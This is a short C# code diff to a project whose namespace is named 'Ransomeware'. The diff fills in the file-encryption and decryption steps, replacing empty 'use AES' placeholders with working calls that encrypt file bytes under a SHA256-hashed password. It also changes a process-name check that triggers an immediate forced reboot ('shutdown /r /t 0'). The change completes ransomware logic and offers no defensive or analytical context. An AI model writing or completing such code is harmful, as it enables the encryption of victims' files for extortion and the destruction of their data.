@@ -203,7 +203,7 @@ namespace Ransomeware
         {
             tmr_clock.Stop();
             Process[] _process = null;
-            _process = Process.GetProcessesByName("Ransomware2.0");
+            _process = Process.GetProcessesByName("Ransomware");
             foreach (Process proces in _process)
             {
                 Process.Start("shutdown", "/r /t 0");
@@ -237,8 +237,7 @@ namespace Ransomeware
 
                 // Hash the password with SHA256
                 passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-
-                byte[] bytesEncrypted = null;// use AES
+                byte[] bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted,passwordBytes,128) ;
 
                 string fileEncrypted = file;
 
@@ -310,7 +309,7 @@ namespace Ransomeware
                 byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                 passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
-                byte[] bytesDecrypted = null; //use AES
+                byte[] bytesDecrypted = Cipher.Decrypt(bytesToBeDecrypted, passwordBytes, 128);
 
                 string file = fileEncrypted;
                 File.WriteAllBytes(file, bytesDecrypted);
